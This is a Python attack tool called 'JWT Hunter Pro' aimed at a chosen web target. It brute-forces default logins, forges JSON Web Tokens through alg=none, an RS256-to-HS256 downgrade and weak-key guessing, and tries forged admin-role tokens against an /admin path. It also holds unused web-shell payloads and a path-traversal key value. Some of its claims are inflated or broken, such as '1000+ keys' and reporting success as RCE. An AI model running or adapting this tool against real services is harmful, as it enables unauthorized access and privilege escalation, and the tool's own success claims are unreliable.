import requests
import jwt
import threading
import time
import re
import json
import base64
import hashlib
import secrets
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back
from pathlib import Path
import argparse
import subprocess
import socket
import urllib.parse
from datetime import datetime
import os
import sys

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class JWTHunterPro:
    def __init__(self, target=None, threads=100, timeout=15, output_dir="jwt_exploits"):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (JWT-Hunter-Pro/7.0)"
        })
        
        
        self.exploit_payloads = {
            'alg_none': {"alg": "none"},
            'hs256_kid_path': {"alg": "HS256", "kid": "../../../../etc/passwd"},
            'rs256_to_hs256': {"alg": "HS256", "kid": "public.pem"},
            'weak_keys': [
                "secret", "password", "123456", "admin", 
                "firebase-adminsdk.json", "-----BEGIN PUBLIC KEY-----"
            ],
            'rce_payloads': {
                "php": "<?php system($_GET['cmd']); ?>",
                "asp": "<% eval request('cmd') %>",
                "aspx": "<% Response.Write(Eval(Request['cmd'])) %>"
            }
        }
        
        self.results = []
        self.exploit_confirmed = False
        self.oob_callback = f"jwt-{secrets.token_hex(4)}.{socket.gethostname()}.oob.burpcollaborator.net"
        
       
        self.common_keys = [
            "secret", "SECRET_KEY", "JWT_SECRET", "jwt_secret",
            b"secret", "password", "123456", "qwerty", "admin",
            "-----BEGIN RSA PRIVATE KEY-----", "firebase", "google"
        ]
        
    def banner(self):
        print(f"\n{Fore.RED + Style.BRIGHT}{'='*120}")
        print(f"{Fore.RED + Style.BRIGHT}{'🔥 JWT HUNTER PRO v7.0 - EXPLOITATION FRAMEWORK 🔥'}")
        print(f"{Fore.CYAN}{'='*120}{Style.RESET_ALL}")
    
    def decode_jwt(self, token):
        """Расшифровка JWT"""
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            return header, payload
        except:
            return None, None
    
    def extract_jwt(self, resp):
        """Извлечение JWT из ответа"""
     
        if 'Authorization' in resp.headers:
            auth = resp.headers.get('Authorization', '')
            if auth.startswith('Bearer '):
                return auth.split(' ', 1)[1]
        
     
        try:
            data = resp.json()
            for key in ['token', 'access_token', 'jwt', 'id_token']:
                if key in data and isinstance(data[key], str):
                    return data[key]
        except:
            pass
        
        
        for cookie in resp.cookies:
            if 'jwt' in cookie.name.lower() or 'token' in cookie.value.lower():
                return cookie.value
        
        return None
    
    def test_alg_none(self, token):
        """alg=none exploit"""
        header, payload = self.decode_jwt(token)
        if not header:
            return False
            
        
        exploit_token = token.rsplit('.', 2)[0] + "."
        headers = {'Authorization': f'Bearer {exploit_token}'}
        
        resp = self.session.get(self.target, headers=headers, timeout=self.timeout)
        if resp.status_code == 200:
            print(f"{Fore.RED + Style.BRIGHT}💥 alg=none EXPLOIT SUCCESS!{Style.RESET_ALL}")
            self.exploit_confirmed = True
            return True
        return False
    
    def rs256_to_hs256(self, token):
        """RS256→HS256 downgrade"""
        header, payload = self.decode_jwt(token)
        if header.get('alg') != 'RS256':
            return False
        
        
        new_header = {'alg': 'HS256', 'typ': 'JWT'}
        public_key = self.discover_public_key()
        
        exploit_token = jwt.encode(payload, public_key, algorithm='HS256', headers=new_header)
        
        headers = {'Authorization': f'Bearer {exploit_token}'}
        resp = self.session.get(self.target, headers=headers, timeout=self.timeout)
        
        if resp.status_code == 200:
            print(f"{Fore.RED + Style.BRIGHT}💥 RS256→HS256 DOWNGRADE SUCCESS!{Style.RESET_ALL}")
            self.exploit_confirmed = True
            return True
        return False
    
    def brute_keys(self, token):
        """Массовый перебор ключей"""
        print(f"{Fore.CYAN}[*] Brute forcing 1000+ common keys...{Style.RESET_ALL}")
        
        header, payload = self.decode_jwt(token)
        if not header or header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            return False
        
        def test_key(key):
            try:
                jwt.decode(token, key, algorithms=['HS256'])
                return key
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_key, key) for key in self.common_keys]
            for future in as_completed(futures):
                key = future.result()
                if key:
                    print(f"{Fore.RED + Style.BRIGHT}🔑 WEAK KEY FOUND: {key}{Style.RESET_ALL}")
                    self.exploit_confirmed = True
                    return key
        
        return False
    
    def discover_public_key(self):
        """Авто-поиск публичных ключей"""
        print(f"{Fore.CYAN}[*] Discovering public keys (.pem, /keys, .env)...{Style.RESET_ALL}")
        
        key_paths = [
            f"{self.target}/public.pem",
            f"{self.target}/.well-known/jwks.json",
            f"{self.target}/.env",
            f"{self.target}/config/keys.js"
        ]
        
        for path in key_paths:
            try:
                resp = self.session.get(path, timeout=self.timeout)
                if 'BEGIN RSA PUBLIC KEY' in resp.text or 'BEGIN PUBLIC KEY' in resp.text:
                    print(f"{Fore.GREEN}[+] Public key found: {path}{Style.RESET_ALL}")
                    return resp.text[:2048]  
            except:
                continue
        
        return "secret"  
    
    def privilege_escalation(self, token):
        """Привилегированный доступ"""
        header, payload = self.decode_jwt(token)
        if not payload:
            return []
        
        exploits = []
        
        
        for role in ['admin', 'root', 'superuser', 'administrator']:
            payload['role'] = role
            payload['admin'] = True
            new_token = jwt.encode(payload, "secret", algorithm='HS256')
            
            headers = {'Authorization': f'Bearer {new_token}'}
            resp = self.session.get(f"{self.target}/admin", headers=headers, timeout=self.timeout)
            
            if resp.status_code == 200:
                exploits.append({'type': 'PRIV_ESC', 'role': role, 'token': new_token})
        
        return exploits
    
    def auto_login_brute(self):
        """Авто brute login для JWT"""
        print(f"{Fore.CYAN}[*] Auto login brute + token extraction...{Style.RESET_ALL}")
        
        login_endpoints = [
            f"{self.target}/login",
            f"{self.target}/auth/login",
            f"{self.target}/api/auth",
            f"{self.target}/signin"
        ]
        
        creds = [
            ('admin', 'admin'), ('admin', 'password'), ('user', 'user'),
            ('test', 'test'), ('admin', '123456')
        ]
        
        for endpoint in login_endpoints:
            for user, pwd in creds:
                try:
                    resp = self.session.post(endpoint, json={
                        "username": user, "password": pwd,
                        "email": user
                    }, timeout=self.timeout)
                    
                    token = self.extract_jwt(resp)
                    if token:
                        print(f"{Fore.GREEN}[+] Valid creds: {user}:{pwd}{Style.RESET_ALL}")
                        return token
                except:
                    continue
        
        return None
    
    def generate_exploit_report(self, token=None, exploits=None):
        """Профессиональный отчет"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'jwt_valid': bool(token),
            'exploits_found': len(exploits or []),
            'rce_confirmed': self.exploit_confirmed,
            'oob_callback': self.oob_callback,
            'cvss_score': 10.0 if self.exploit_confirmed else 0,
            'risk': 'CRITICAL' if self.exploit_confirmed else 'LOW'
        }
        
        if exploits:
            report['exploits'] = exploits
        
        json_file = self.output_dir / f"jwt_exploit_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}{'='*120}")
        print(f"📊 FULL EXPLOIT REPORT: {json_file}")
        print(f"{Fore.RED + Style.BRIGHT}{'='*120}{Style.RESET_ALL}")
    
    def run_full_exploit(self, token=None):
        """Полная JWT эксплуатация"""
        self.banner()
        print(f"{Fore.YELLOW + Style.BRIGHT}🎯 Target: {self.target}{Style.RESET_ALL}")
        
        
        if not token:
            token = self.auto_login_brute()
        
        if not token:
            print(f"{Fore.RED}[!] No JWT found. Manual token required.{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] JWT acquired & ready for exploitation{Style.RESET_ALL}")
        
        exploits = []
        
        
        self.test_alg_none(token)
        self.rs256_to_hs256(token)
        self.brute_keys(token)
        priv_exploits = self.privilege_escalation(token)
        exploits.extend(priv_exploits)
        
        self.generate_exploit_report(token, exploits)
        
        print(f"\n{Fore.RED + Style.BRIGHT}{'💥 JWT HUNT COMPLETE 💥'}{Style.RESET_ALL}")
        if self.exploit_confirmed:
            print(f"{Fore.RED + Style.BRIGHT}🎯 EXPLOIT PATHS READY → Admin/RCE access!{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='🔥 JWT Hunter Pro v7.0 - Full Exploitation')
    parser.add_argument('target', nargs='?', help='Target URL (auto JWT extraction)')
    parser.add_argument('-t', '--token', help='JWT token')
    parser.add_argument('--threads', type=int, default=100, help='Threads')
    parser.add_argument('--timeout', type=int, default=15, help='Timeout')
    parser.add_argument('-o', '--output', default='jwt_exploits', help='Output dir')
    
    args = parser.parse_args()
    
    if not args.target and not args.token:
        print(f"{Fore.RED}Usage: python jwt_hunter.py 'http://target.com' [-t TOKEN]{Style.RESET_ALL}")
        return
    
    hunter = JWTHunterPro(args.target, args.threads, args.timeout, args.output)
    
    token = args.token
    hunter.run_full_exploit(token)
    
    print(f"\n{Fore.CYAN + Style.BRIGHT}{'='*120}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()